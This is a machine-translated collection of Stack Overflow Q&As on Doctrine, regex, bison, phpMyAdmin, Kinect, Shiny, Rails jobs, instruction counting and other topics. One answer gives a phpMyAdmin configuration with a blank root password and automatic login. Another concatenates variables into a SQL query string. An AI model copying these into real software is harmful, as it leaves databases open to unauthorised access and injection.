            ->createQuery('p')
            ->where('p.store_id = ?', $store_id)
            ->andWhere('p.collection = ?', $this->product->getCollection())
            ->andWhere('p.image_path IS NOT NULL')
            ->count();

$productsCollection = Doctrine::getTable('Product')
            ->createQuery('p')
            ->where('p.store_id = ?', $store_id)
            ->andWhere('p.collection = ?', $this->product->getCollection())
            ->andWhere('p.status_id = ?', Product::_ONLINE)
            ->andWhere('p.id<>?', $this->product_id)
            ->offset(rand(0, $productsCount - 1))
            ->execute(); 
```

*   教义：1.2
*   Symfony：1.4
*   PHP: 5.3

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T22:03:30.837

您可以使用子查询，因为您的查询不相同。这里有[**DQL: Doctrine Query Language**](http://docs.doctrine-project.org/projects/doctrine1/en/latest/en/manual/dql-doctrine-query-language.html#subqueries)的一些例子。这是伪代码，我不知道它是否会立即生效。

```
$q = Doctrine_Query::create()
            ->from('Product p')
            ->select('id, sum(id) as sumEntries') 
            ->addSelect('(SELECT id, name) // and else fields that you need
                        FROM Product a
                        WHERE (
                        a.store_id  = '.$store_id.' 
                        AND  
                        a.collection = '.$this->product->getCollection().'
                        AND
                        a.id<>= '.$this->product_id.' 
                        )
                        OFFSET '.rand(0, $productsCount - 1).') // I am not sure in this line
                        as resultSubquery')

            ->where('p.store_id = ?', $store_id)
            ->andWhere('p.collection = ?', $this->product->getCollection())
            ->andWhere('p.image_path IS NOT NULL')

  $result =  $q->execute(array(), Doctrine_Core::HYDRATE_ARRAY); //This greatly speeds up query 
```

你得到一个数组`$result`。做`var_dump()`并检查其内容。我不确定这段代码是否会立即生效，但我建议您朝着这个方向前进。

ps：我向您推荐这个关于 Doctrine 查询优化的有趣演示文稿：[Doctrine 1.2 Optimization](http://www.slideshare.net/afilina/doctrine-12-optimization)

# java - Java，正则表达式用空格捕获字符串

> ID：13313493
> 
> 赞同：0
> 
> 时间：2012-11-09T18:01:58.787
> 
> 标签：java, regex, string

这是我的原始字符串，名为“响应”：

```
String response = "attributes[{"displayName":"Joe Smith","fact":"super"},{"displayName":"Kieron Kindle","fact":"this is great"}]"; 
```

我正在尝试解析字符串并提取所有 id 值，例如

```
String[0] = Joe Smith
String[1] = Kieron Kindle

Pattern idPattern = Pattern.compile("\"displayName\":(\\w)"); // regular expression
Matcher matcher = idPattern.matcher(response);

while(matcher.find()){
    System.out.println(matcher.group(1));
} 
```

当我尝试打印值时，没有任何内容被打印到屏幕上（也不例外）
，正则表达式寻找`"displayName":"`左括号和`"`右括号，然后提取`(\\w)`它们之间的任何单词？
感谢任何帮助！从我的正则表达式中删除了`\n`字符，这是一个格式错误，对不起各位！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:04:38.043

但是为什么你`\n`在你的正则表达式中使用了 a 呢？那应该是`\"`。您还使用`\\w`了仅匹配单个字符的。你需要使用一个量词。和一个`Reluctant one`。

所以，你修改的正则表达式是这样的： -

```
Pattern.compile("\"displayName\":\"(\\w+?)\""); // This won't consider space 
```

但是，由于你`String`也可以包含空间，所以你不应该使用`\\w`. 它不会匹配空格。

所以，最后，你应该使用这个正则表达式，它匹配两个引号之间的任何字符，除了`inverted comma`它自己： -

```
Pattern.compile("\"displayName\":\"([^\"]+)\""); 
```

在您的代码中替换上述模式后，您的输出将如下所示： -

```
"Joe Smith"
"Kieron Kindle" 
```

* * *

您可以在这些教程中阅读有关 Regex 的更多信息：-

*   [http://docs.oracle.com/javase/tutorial/essential/regex/](http://docs.oracle.com/javase/tutorial/essential/regex/)
*   [http://www.vogella.com/articles/JavaRegularExpressions/article.html](http://www.vogella.com/articles/JavaRegularExpressions/article.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:04:32.530

你应该使用这个`regex`

```
\"displayName\":\"(.*?)\" 
```

`(.*?)`匹配 0 到多个字符

**或**[更正您的正则表达式]

```
\"displayName\":\"([\w\s]+)\" 
```

`([\w\s]+)`匹配单词 ie`\w` **或**空格 ie `\s`1 到多次 ie`+`

`Group1`现在有数据

# parsing - Bison Flex 无法访问野牛规则部分中的第一个令牌

> ID：13313494
> 
> 赞同：2
> 
> 时间：2012-11-09T18:02:01.600
> 
> 标签：parsing, bison, lex, flex-lexer

柔性：

```
%option noyywrap
%{
    #include "syntax.hpp"
    #include <cstdlib>
    extern "C" int isatty(int);
%}
%%

\#.*                                                {}
\[[A-Za-z_]*\]                                      {yylval.val_char=yytext; return SECTION_NAME;}
[A-Z_a-z[:digit:]]*[A-Z_a-z][A-Z_a-z[:digit:]]*     {yylval.val_char=yytext ;return OPTION_NAME;}
\n                                                  {}
=\".*?\"                                            {yylval.val_char=yytext+1; return VALUE_STRING;}
=[ A-Z_a-z[:digit:]]*[A-Z_a-z][A-Z_a-z[:digit:] ]*  {yylval.val_char=yytext+1; return VALUE_ENUM;}
=[ [:digit:] ]*                                     {yylval.val_int=atoi(yytext+1); return VALUE_INTEGER;}
=[ [:digit:]\.[:digit:]]+                           {yylval.val_float=atof(yytext+1); return VALUE_FLOAT;}

" "                                                 {}
%% 
```

野牛：

```
%{
    #include <iostream> 
    int yylex();
    int yyerror(const char *p) {return 0;}

%}

     %union  {
            float val_float;
            int val_int;
            char* val_char;
           };   
     %token <val_char> SECTION_NAME
     %token <val_char> OPTION_NAME
     %token <val_int> VALUE_INTEGER
     %token <val_float> VALUE_FLOAT
     %token <val_char> VALUE_STRING
     %token <val_char> VALUE_ENUM

%%
    input
        :input line
        |line
        ;
    line
       :section
       |value
       ;

    section
        :SECTION_NAME {std::cout<<$1; std::cout<<std::endl;}
        ;

    value
        :OPTION_NAME VALUE_INTEGER  {std::cout<<$1, std::cout<<std::endl;}
        |OPTION_NAME VALUE_FLOAT {std::cout<<$1; std::cout<<std::endl;}
        |OPTION_NAME VALUE_ENUM {std::cout<<$1; std::cout<<std::endl;}
        |OPTION_NAME VALUE_STRING {std::cout<<$1;std::cout<<std::endl;}
        ;
%% 
```

我正在尝试测试小型 ini 配置文件解析器。它必须解析 option=value 对，其中 value 可以是 int、float、带引号的字符串或枚举常量。此代码应将文件中的 SECTION_NAMEs 和 OPTION_NAMEs 提供给控制台输出。但事实并非如此。相反，它会打印整个文件。如果我将 $1 更改为 $2，它可以正常工作并打印 SECTION_NAMEs 和 VALUES。它出什么问题了？如何访问 OPTION_NAME 令牌值？提前致谢。

UPD。Flex 部分工作正常。{printf(yylval.val_char); return OPTION_NAME;} 为控制台提供正确的令牌值。也许是野牛部分的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T21:30:16.083

问题是您要`yytext`为令牌语义值返回指针。 `yytext`是 flex 用于匹配标记的内部缓冲区，它仅在下一次调用`yylex`读取下一个标记之前有效。因此，您的语义值（`$1`等）最终都将悬空指针指向缓冲区，该缓冲区将被来自以后标记的更多标记数据覆盖。

您需要将字符串复制`yytext`到一些可用时间更长的存储中。 `strdup`对此非常有用：

```
\[[A-Za-z_]*\]                                      {yylval.val_char=strdup(yytext); return SECTION_NAME;}
[A-Z_a-z[:digit:]]*[A-Z_a-z][A-Z_a-z[:digit:]]*     {yylval.val_char=stdrup(yytext); return OPTION_NAME;} 
```

ETC

# phpmyadmin - 关闭 PhpMyAdmin 自动注销

> ID：13313495
> 
> 赞同：1
> 
> 时间：2012-11-09T18:02:05.213
> 
> 标签：phpmyadmin, mamp

我刚刚搬到苹果公司，我安装了 MAMP 来替换我通常在 Windows 上使用的 WAMP，但现在我显然丢失了我的配置设置，我正在努力使用 MAMP 来做这件事。

首先，我真的想在 1440 秒的空闲时间后关闭 PHPMyAdmin 的自动注销，我也不想每次都登录。在 wamp 中，我只是将我的 root 密码设置为空白，并在配置文件中将登录设置为 false。

我已经在网上阅读并尝试了一些东西，但我似乎无法找到更改所需的文件。

任何帮助，将不胜感激。提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T02:10:16.480

Your config file needs this code and it should resolve your both the issues.

```
$cfg['blowfish_secret'] = 'xampp'; 
$i = 0;
$i++;
/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = '';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Lang'] = '';
$cfg['Servers'][$i]['host'] = '127.0.0.1';
$cfg['Servers'][$i]['connect_type'] = 'tcp'; 
```

# c# - “终止”一个类的实例

> ID：13313496
> 
> 赞同：1
> 
> 时间：2012-11-09T18:02:07.460
> 
> 标签：c#, oop, kinect

美好的一天嗯。

我正在做一个 C# 项目，我们使用 Microsoft Kinect，用它来跟踪执行一系列跳跃的人，并获取生成的骨架以计算膝盖角度。

昨晚当我们测试科目时，我认为最好控制程序，您可以单击并结束“当前”测试科目的输出文件，然后开始另一个科目。为了开始跟踪骨架，我们创建了 Kinect for Windows SDK 中的 Tracker 类的跟踪器对象。然后，这将启动执行跟踪和输出的所有逻辑。但是，当我们“关闭”第一个主题的输出时，我们似乎只是在关闭文件，而不是跟踪器对象的实际实例。这会导致跟踪器保持“打开”状态，与我们为新测试对象创建的跟踪器对象的新实例并存，使用双倍的计算资源并导致性能下降到无法接受的程度。

如何“关闭”跟踪器对象的第一个实例？

如果你们需要检查代码，请告诉我；我没有包括它，因为在这里发帖太长了。

编辑：

这里至少有一些代码。我们有“开始”事件（针对第一个测试对象）、“下一个对象”事件（针对后续测试对象）和“跟踪器”代码。

下一个主题：（这是我们需要进行更改的地方）

```
 /// <summary>
    /// stops "old" file and graph streams, closes file, launches dialog for new subject and starts 
    /// stream up again
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void buttonNextSubject_Click(object sender, RoutedEventArgs e)
    {
        //Ask the user if they're sure they want to stop the current stream
        if (MessageBox.Show("Are you sure you want to stop the stream and start a new one?", "New Subject", MessageBoxButton.OKCancel) == MessageBoxResult.OK){
            if (fileCheck == true)
            {
                tracker.outputFile.closeFiles();
                //SHUT DOWN OLD TRACKER HERE
            }
            else
            {
                return;
            }
        }

        Microsoft.Win32.SaveFileDialog dlg = new Microsoft.Win32.SaveFileDialog();
        dlg.FileName = "Subject"; //Default file name
        dlg.DefaultExt = ".txt"; //Default file extension
        dlg.Filter = "Text documents (.txt)|*.txt"; //Filter files by extension
        //Show save file dialog box
        Nullable<bool> result = dlg.ShowDialog();
        buttonStart.IsEnabled = false;
        buttonPause.IsEnabled = true;
        buttonResume.IsEnabled = false;
        fileCheck = true;

        //Start Kinect- If no sensor, ask to connect one and exit.
        try
        {
            this.sensor.Start();
        }
        catch (IOException)
        {
            this.sensor = null;
            //display error message here
            MessageBox.Show("No Kinect sensor found. Please connect one and restart the application", "*****ERROR*****");
        }
        sensor.ElevationAngle = 0;
        tracker = new Tracker(sensor, this, dlg.FileName);
    }
} 
```

跟踪器对象/跟踪器类：

```
 internal class Tracker{
        private Skeleton[] skeletons = null;
        private MainWindow window;
        public Class1 outputFile;
        public string fn;
        public Tracker(KinectSensor sensor, MainWindow win, string fileName){                
                //Connect the skeleton frame handler and enable skeleton tracking
                sensor.SkeletonFrameReady += SensorSkeletonFrameReady;
                sensor.SkeletonStream.Enable();
                sensor.ColorFrameReady += SensorColorFrameReady;
                sensor.ColorStream.Enable();
                window = win;                
                outputFile = new Class1(fileName);
                fn = fileName;
                window.graphTickPen2.DashStyle = System.Windows.Media.DashStyles.Dash;
        } 
```

最后，我基于“下一个主题”事件的“开始”事件：

```
 private void buttonStart_Click(object sender, RoutedEventArgs e){           
        // Configure save file dialog box
        Microsoft.Win32.SaveFileDialog dlg = new Microsoft.Win32.SaveFileDialog();
        dlg.FileName = "Default"; // Default file name
        dlg.DefaultExt = ".txt"; // Default file extension
        dlg.Filter = "Text documents (.txt)|*.txt"; // Filter files by extension
        // Show save file dialog box
        Nullable<bool> result = dlg.ShowDialog();
        buttonStart.IsEnabled = false;
        buttonPause.IsEnabled = true;
        buttonResume.IsEnabled = false;
        fileCheck = true;
        //Create drawing group
        this.drawingGroup = new DrawingGroup();
        this.leftLegDrawingGroup = new DrawingGroup();
        this.rightLegDrawingGroup = new DrawingGroup();
        //Create image source for WPF control
        this.imageSource = new DrawingImage(this.drawingGroup);
        this.leftLegBoxImageSource = new DrawingImage(this.leftLegDrawingGroup);
        this.rightLegBoxImageSource = new DrawingImage(this.rightLegDrawingGroup);
        leftLegColorBitmap = new WriteableBitmap(483, 152, 96, 96, PixelFormats.Bgr32, null);
        rightLegColorBitmap = new WriteableBitmap(483, 152, 96, 96, PixelFormats.Bgr32, null);
        colorBitmap = new WriteableBitmap(640, 480, 96, 96, PixelFormats.Bgr32, null);
        colorPixels = new byte[this.sensor.ColorStream.FramePixelDataLength];           
        //Start Kinect- If no sensor, ask to connect one and exit.
        try{
            this.sensor.Start();
        }
        catch (IOException){
            this.sensor = null;
            //display error message here
            MessageBox.Show("No Kinect sensor found. Please connect one and restart the application", "*****ERROR*****");
        }
        sensor.ElevationAngle = 0;            
        tracker = new Tracker(sensor, this, dlg.FileName);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:10:36.030

我只听说过`.dispose()`“终止一个类的实例”，也就是处理它的资源分配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:15:33.530

窥视 Kinect API 会告诉您，您使用 KinectSensor.Stop() 的方式与您想的完全一样

[参考 Kinect API](http://msdn.microsoft.com/en-us/library/microsoft.kinect.kinectsensor_members.aspx)

或者你的问题是这个函数没有做被引用的事情？

编辑：正如我现在理解的问题，您可以像这样从传感器取消订阅跟踪器：

```
sensor.SkeletonFrameReady -= tracker.SensorSkeletonFrameReady;
sensor.ColorFrameReady -= tracker.SensorColorFrameReady; 
```

您也可以简单地将传感器中的事件设置为 null，这将等于相同（除了它将取消订阅该事件的任何事件处理程序）

```
sensor.SkeletonFrameReady = null;
sensor.ColorFrameReady = null; 
```

在这个例子中，如果你真的只有跟踪器监听传感器的流，这可能会更容易（因为没有实例化跟踪器时不会出现问题等）

# css - IE 无法正确读取 CSS，将内容放在侧边栏下方

> ID：13313501
> 
> 赞同：2
> 
> 时间：2012-11-09T18:02:24.587
> 
> 标签：css, internet-explorer

我正在尝试更正 CSS 以使其与 IE 兼容。我的页面在 chrome 和 Firefox 中看起来不错。我想在左侧导航旁边放置一个文本框，但 IE 将文本框显示在其他所有内容下方。

查看[bcaplan.com](http://bcaplan.com)以了解我的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:08:42.010

替换为`margin-left: 190px;`_`#rcol``float: right;`

# r - R studio 闪亮的条件语句

> ID：13313503
> 
> 赞同：5
> 
> 时间：2012-11-09T18:02:37.037
> 
> 标签：r, shiny

我一直在玩 R shiny，有一个问题。

我想创建一个多选项卡多数据集包。由于不同的数据集并没有过度相关，我希望用户能够选择他们想要查看的数据集，并为此更改可供他们使用的过滤选项。

所以我想要这样的东西，

```
selectInput("variable", "Variable:",
list(""Cylinders" = "cyl",
"Transmission" = "am"),

if (selectInput == "Transmission") {
    sliderInput("integer", "Integer:", 
    min=0, max=1, value=0) },

else{

 sliderInput("decimal", "Decimal:", 
             min = 0, max = 1, value = 1) } 
```

我如何在 Shiny 中做一个条件句？将其视为正常的 R 条件似乎不起作用。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-09T21:03:21.227

`conditionalPanel`是你想要的。[http://rstudio.github.com/shiny/tutorial/#dynamic-ui](http://rstudio.github.com/shiny/tutorial/#dynamic-ui)

```
selectInput("variable", "Variable:",
list(""Cylinders" = "cyl",
"Transmission" = "am"),

conditionalPanel(condition = "input.variable == 'am'",
    sliderInput("integer", "Integer:", 
    min=0, max=1, value=0)),

conditionalPanel(condition = "input.variable == 'cyl'",
 sliderInput("decimal", "Decimal:", 
             min = 0, max = 1, value = 1)) 
```

（我实际上并没有尝试运行此代码，但您应该能够理解）

请注意，conditionalPanel 只是隐藏了控件，子控件无论是否显示都仍然存在。在您的服务器逻辑中，您必须使用`if (input$variable == 'am')`来查看您所处的模式（无论如何这可能是自然的方式），而不是测试`input$integer`or的存在`input$decimal`。

# ruby-on-rails - Rails 简单的时事通讯/邮件列表，通过电子邮件通知新的搜索结果

> ID：13313504
> 
> 赞同：0
> 
> 时间：2012-11-09T18:02:37.857
> 
> 标签：ruby-on-rails, ruby-on-rails-3, cron, newsletter, mailing-list

我的用户可以保存他们喜欢的搜索。现在我需要给他们订阅的可能性，以便在有新的搜索结果可用时（如 Yahoo 答案）接收电子邮件通知。

我已经设置了一个**邮件**程序，当*手动*触发时，它工作正常。

现在我需要做的就是在**预定的工作**中给邮件发件人打电话，但是……我真的不是那个领域的专家。所以，在[任何](https://github.com/javan/whenever)时候，[Delayed_job](http://tobi.github.com/delayed_job)，[Sidekiq](http://mperham.github.com/sidekiq/)，[Resque Scheduler](https://github.com/bvandenbos/resque-scheduler) *& co。*我应该使用哪个（或多个组合）来完成此类任务（长时间运行的过程，需要多次邮寄）？

**编辑**

我开发了一个**工作示例应用程序**，可在 Github：[NotiSearch](https://github.com/duccioarmenise/NotiSearch)上找到。

它有很好的文档记录，因此，如果您正在尝试开发类似的东西，我绝对建议您检查一下。

PS：我选择依赖**when**和**delayed_job**，因为它们没有外部依赖关系，如果需要，它应该很容易过渡到更具可扩展性的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T20:31:33.217

我亲自与 Resque 和 Sidekiq 合作过。这两者之间的主要区别在于 Sidekiq 为每个作业生成新线程。

Resque 每个作业都有一个进程。这基本上意味着 Resque 假设失败，如果一个进程失败，其他作业也不会失败。Sidekiq，因为它与线程一起工作，如果其中一个线程由于某种原因被锁定，整个进程将被锁定。

来自另一个 QA [Resque vs Sidekiq 的答案？](https://stackoverflow.com/questions/11580954/resque-vs-sidekiq)

回复：

优点：

不需要线程安全（几乎可以与任何 gem 一起使用）；没有解释器偏好（您可以使用任何 ruby​​）；大量的插件。缺点

每个工作人员运行一个进程（使用更多内存）；不会重试作业（无论如何，开箱即用）。Sidekiq：

优点

每个工人运行线程（使用更少的内存）；更少的分叉（工作更快）；开箱即用的更多选项。缺点

[巨大] 需要您的代码和所有依赖项的线程安全。如果你用线程运行线程不安全的代码，你就是在自找麻烦；插件少得多（目前只有 2 个）；在某些红宝石上比其他红宝石效果更好（推荐使用 jruby 和 rubinius，由于 GVL（全局 VM 锁定），MRI 的效率会降低）。

**编辑**

无论如何回答你的问题。在我们使用邮件程序的所有项目中，我们都使用 Resque。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-23T15:35:51.633

试试[MailyHerald](http://mailyherald.org) - rails 的邮件管理 gem。它将允许您设置仅在满足特定条件时发送给用户的定期邮件 - 即新的搜索结果可用。

MailyHerald 在后台自动处理所有邮件（使用 Sidekiq），并提供漂亮的 web-ui 用于管理目的。

# c - 快速计算 C 程序中执行的指令数的方法

> ID：13313510
> 
> 赞同：9
> 
> 时间：2012-11-09T18:02:56.570
> 
> 标签：c, linux, profile

有没有一种简单的方法可以在执行 C 程序时快速计算执行的指令数量（x86 指令 - 每个指令和多少）？

我`gcc version 4.7.1 (GCC)`在`x86_64 GNU/Linux`机器上使用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2020-11-16T18:10:10.977

**Linux`perf_event_open`系统调用与`config = PERF_COUNT_HW_INSTRUCTIONS`**

这个 Linux 系统调用似乎是性能事件的跨体系结构包装器，包括来自 CPU 的硬件性能计数器和来自内核的软件事件。

这是一个改编自`man perf_event_open`页面的示例：

perf_event_open.c

```
#define _GNU_SOURCE
#include <asm/unistd.h>
#include <linux/perf_event.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <inttypes.h>
#include <sys/types.h>

static long
perf_event_open(struct perf_event_attr *hw_event, pid_t pid,
                int cpu, int group_fd, unsigned long flags)
{
    int ret;

    ret = syscall(__NR_perf_event_open, hw_event, pid, cpu,
                    group_fd, flags);
    return ret;
}

int
main(int argc, char **argv)
{
    struct perf_event_attr pe;
    long long count;
    int fd;

    uint64_t n;
    if (argc > 1) {
        n = strtoll(argv[1], NULL, 0);
    } else {
        n = 10000;
    }

    memset(&pe, 0, sizeof(struct perf_event_attr));
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(struct perf_event_attr);
    pe.config = PERF_COUNT_HW_INSTRUCTIONS;
    pe.disabled = 1;
    pe.exclude_kernel = 1;
    // Don't count hypervisor events.
    pe.exclude_hv = 1;

    fd = perf_event_open(&pe, 0, -1, -1, 0);
    if (fd == -1) {
        fprintf(stderr, "Error opening leader %llx\n", pe.config);
        exit(EXIT_FAILURE);
    }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    /* Loop n times, should be good enough for -O0\. */
    __asm__ (
        "1:;\n"
        "sub $1, %[n];\n"
        "jne 1b;\n"
        : [n] "+r" (n)
        :
        :
    );

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    read(fd, &count, sizeof(long long));

    printf("Used %lld instructions\n", count);

    close(fd);
} 
```

编译并运行：

```
g++ -ggdb3 -O0 -std=c++11 -Wall -Wextra -pedantic -o perf_event_open.out perf_event_open.c
./perf_event_open.out 
```

输出：

```
Used 20016 instructions 
```

所以我们看到结果非常接近预期值 20000：10k *`__asm__`块中每个循环的两条指令（`sub`, `jne`）。

如果我改变论点，即使是低值，例如`100`：

```
./perf_event_open.out 100 
```

它给：

```
Used 216 instructions 
```

保持恒定+ 16条指令，所以看起来准确度很高，那16条一定只是`ioctl`我们小循环之后的设置指令。

现在您可能还对以下内容感兴趣：

*   防止重新排序系统调用：[在 C++ 中强制执行语句顺序](https://stackoverflow.com/questions/37786547/enforcing-statement-order-in-c/56865717#56865717)
*   防止测试循环被优化：[如何防止 GCC 优化繁忙的等待循环？](https://stackoverflow.com/questions/7083482/how-to-prevent-gcc-from-optimizing-out-a-busy-wait-loop/58758133#58758133)

可以通过此系统调用测量的其他感兴趣的事件：

*   循环计数：[如何从 C++ 获取 x86_64 中的 CPU 循环计数？](https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c/64898073#64898073)

在 Ubuntu 20.04 amd64、GCC 9.3.0、Linux 内核 5.4.0、Intel Core i7-7820HQ CPU 上测试。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:08:35.723

[可能是这个问题](https://stackoverflow.com/questions/375913/what-can-i-use-to-profile-c-code-in-linux)的副本

我说可能是因为您询问了汇编程序指令，但该问题处理了 C 级代码分析。

但是，我对您的问题是：您为什么要分析实际执行的机器指令？作为第一个问题，这在各种编译器及其优化设置之间会有所不同。作为一个更实际的问题，您实际上可以用这些信息做什么？如果您正在搜索/优化瓶颈，代码分析器就是您正在寻找的。

不过，我可能会在这里错过一些重要的事情。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-12-18T23:44:11.860

您可以使用硬件性能计数器 (HPC) 轻松计算执行指令的数量。为了访问 HPC，您需要一个接口。我推荐你使用 PAPI 性能 API。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-06-22T07:56:26.233

### 英特尔引脚`instcount`

您可以使用 Intel 的二进制检测工具“ [Pin](https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool) ”。我会避免使用模拟器（它们通常非常慢）。Pin 完成了您可以使用模拟器完成的大部分工作，而无需重新编译二进制文件并以正常的执行速度（取决于您使用的 pin 工具）。

用 Pin 计算指令的数量：

1.  从此处下载最新的（或 3.10，如果此答案过时）针套件。
2.  提取所有内容并转到目录：`cd pin-root/source/tools/ManualExample/`
3.  制作目录中的所有工具：`make all`
4.  使用以下命令运行名为 inscount0.so 的工具：`../../../pin -t obj-intel64/inscount0.so -- your-binary-here`
5.  获取文件中的指令计数`inscount.out`，`cat inscount.out`.

输出将类似于：

```
➜ ../../../pin -t obj-intel64/inscount0.so -- /bin/ls
buffer_linux.cpp       itrace.cpp
buffer_windows.cpp     little_malloc.c
countreps.cpp          makefile
detach.cpp         makefile.rules
divide_by_zero_unix.c  malloc_mt.cpp
isampling.cpp          w_malloctrace.cpp
➜ cat inscount.out
Count 716372 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-04-18T07:04:17.033

虽然取决于程序不是“快速”，但这可能已经[在这个问题](https://stackoverflow.com/questions/21628002/counting-machine-instructions-using-gdb)中得到了回答。在这里，Mark Plotnick 建议使用`gdb`来观察程序计数器寄存器的变化：

```
# instructioncount.gdb
set pagination off
set $count=0
while ($pc != 0xyourstoppingaddress)
    stepi
    set $count++
end
print $count
quit 
```

然后，开始`gdb`你的程序：

```
gdb --batch --command instructioncount.gdb --args ./yourexecutable with its arguments 
```

要获取结束地址`0xyourstoppingaddress`，您可以使用以下脚本：

```
# stopaddress.gdb
break main
run
info frame
quit 
```

在函数 上放置一个断点`main`，并给出：

```
$ gdb --batch --command stopaddress.gdb --args ./yourexecutable with its arguments
...
Stack level 0, frame at 0x7fffffffdf70:
 rip = 0x40089d in main (main_aes.c:33); saved rip 0x7ffff7a66d20
 source language c.
 Arglist at 0x7fffffffdf60, args: argc=3, argv=0x7fffffffe048
... 
```

这里重要的是`saved rip 0x7ffff7a66d20`部分。在我的 CPU 上，`rip`是指令指针，`saved rip`是“返回地址”，如 pepero[在此答案](https://stackoverflow.com/a/16539242/4802862)中所述。

所以在这种情况下，停止地址是`0x7ffff7a66d20`，也就是`main`函数的返回地址。即程序执行结束。

# android - 应用无法连接到 Google Play 授权服务？

> ID：13313511
> 
> 赞同：0
> 
> 时间：2012-11-09T18:02:58.787
> 
> 标签：android, google-play

我已将 Google Play 许可库整合到我的应用程序中，并且测试在我的两台设备（Samsung Galaxy S2 和 HTC Desire HD）上运行良好。但是，当尝试在第三台设备（HTC Wildfire S）上进行许可检查时，它无法连接到服务，每次都返回“不允许/重试”响应。真的被这种行为弄糊涂了。任何人都有任何想法可能会发生什么？手机运行 Android 版本 2.3.5，具有最新版本的 Google Play (3.9.16)，我已登录我的 Google Play 帐户并且我有一个有效的互联网连接...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T15:11:21.710

两周后，我没有对我的许可代码进行任何更改，我回去在我的 HTC Wildfire S 上尝试了这个，奇怪的是（但令人愉快！）它现在可以工作了。一定是 Google Play 许可服务的临时问题，而不是我的代码......

# jquery - 尝试使用 jQuery 在 .net 页面中设置选择选项

> ID：13313513
> 
> 赞同：1
> 
> 时间：2012-11-09T18:03:02.787
> 
> 标签：jquery, asp.net, select

我已经尝试了在这里找到的所有设置选择选项的建议，包括 .val() .attr() 和 .prop()。我一定是做错了什么。目标是根据可选的 URL 参数选择选择标记的选项。无论我做什么，它都不会改变列表的值。

请注意，我被困在使用 jQuery 1.4

**HTML 片段：**

```
<select name="Widget91$Widget91$MetaTagList" onchange="javascript:setTimeout('__doPostBack(\'Widget91$Widget91$MetaTagList\',\'\')', 0)" id="WidgetTabHost_WidgetZone48_WidgetContainer91_Widget91_MetaTagList">
    <option selected="selected" value="">None</option>
    <option value="T-Code">T-Code</option>
    <option value="Job Role">Job Role</option>
    <option value="Functional Area">Functional Area</option>
    <option value="Sub Area">Sub Area</option>
</select> 
```

**Javascript编码：**

```
$(document).ready(function(){
    filter = getURLParameter("filter");
    if (filter != null) {
    jQuery("#<%=MetaTagList.ClientID%>").val(filter);       
    }
}); 
```

**Javascript 服务：**

```
$(document).ready(function(){
    filter = getURLParameter("filter");
    if (filter != null) {
            jQuery("#WidgetTabHost_WidgetZone48_WidgetContainer91_Widget91_MetaTagList").val(filter);   
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:05:43.307

试试这个来选择传入的过滤器

```
$(document).ready(function(){
 filter = getURLParameter("filter");
 if (filter != null) {
 jQuery("#<%=MetaTagList.ClientID%>").val(filter).attr('selected',true);       
 }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:07:21.533

尝试这个：

```
$("#<%=MetaTagList.ClientID%>").val(filter); 
```

# powershell - 设置 AzureDeployment - ProtocolException

> ID：13313514
> 
> 赞同：6
> 
> 时间：2012-11-09T18:03:11.927
> 
> 标签：powershell, azure

安装 Windows Azure Powershell（2012 年 10 月版本 0.6.7）后，我收到运行[Set-AzureDeployment](http://msdn.microsoft.com/en-us/library/windowsazure/jj152881.aspx) Cmdlet 的错误。

为 Remove-AzureDeployment 和 New-AzureDeployment 提供相同的参数可以正常工作。

**删除-AzureDeployment** -Slot $slot -ServiceName $serviceName -Force

**New-AzureDeployment** -Slot $slot -Package $packageLocation -Configuration $cloudConfigLocation -label $deploymentLabel -ServiceName $serviceName

但是，当使用带有 -Upgrade 开关和相同参数值的 Set-AzureDeployment 时，出现错误。

**Set-AzureDeployment** -Upgrade -Slot $slot -Package $packageLocation -Configuration $cloudConfigLocation -label $deploymentLabel -ServiceName $serviceName -Force

错误是：

+ CategoryInfo : CloseError: (:) [Set-AzureDeployment], ProtocolException

+fullyQualifiedErrorId：Microsoft.WindowsAzure.Management.ServiceManagement.HostedServices.SetAzureDeploymentCommand

捕获内部异常显示：

```
<Error xmlns="http://schemas.microsoft.com/windowsazure" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><Code>MissingOrIncorrectVersionHeader</Code><Message>The versioning header is not specified or was specified incorrectly.</Message></Error> 
```

任何人都可以就可能出现的问题提供建议吗？

我试图运行的脚本是 PublishCloudService.ps1 from [here](http://www.windowsazure.com/en-us/develop/net/common-tasks/continuous-delivery/#step4)。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-15T18:49:05.367

